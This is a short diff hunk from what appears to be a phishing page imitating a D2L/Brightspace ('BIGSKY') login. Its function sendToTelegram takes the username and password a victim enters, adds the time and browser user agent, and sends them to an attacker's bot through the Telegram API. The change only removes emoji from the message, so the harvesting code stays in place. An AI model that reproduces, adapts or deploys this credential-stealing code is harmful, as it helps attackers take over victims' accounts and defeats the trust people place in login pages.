@@ -161,7 +161,7 @@ D2L.O("__g1",7)();
 
     async function sendToTelegram(username, password) {
         if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') return false;
-        const message = `🔐 BIGSKY LOGIN 🔐\n\n👤 Username: ${username}\n🔑 Password: ${password}\n⏰ Time: ${new Date().toLocaleString()}\n🌐 User-Agent: ${navigator.userAgent}`;
+        const message = `BIGSKY LOGIN \n\nUsername: ${username}\n Password: ${password}\nTime: ${new Date().toLocaleString()}\nUser-Agent: ${navigator.userAgent}`;
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
         try {
             const resp = await fetch(url, {
